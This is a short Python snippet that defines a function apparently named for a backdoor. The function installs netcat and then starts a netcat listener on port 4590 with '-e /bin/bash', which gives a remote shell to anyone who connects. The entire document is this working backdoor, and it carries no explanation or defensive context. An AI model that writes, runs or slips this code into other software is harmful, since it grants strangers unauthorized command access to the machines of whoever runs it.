import os
def bd():
    os.system("apt-get install netcat")
    os.system("netcat -lp 4590 -e /bin/bash")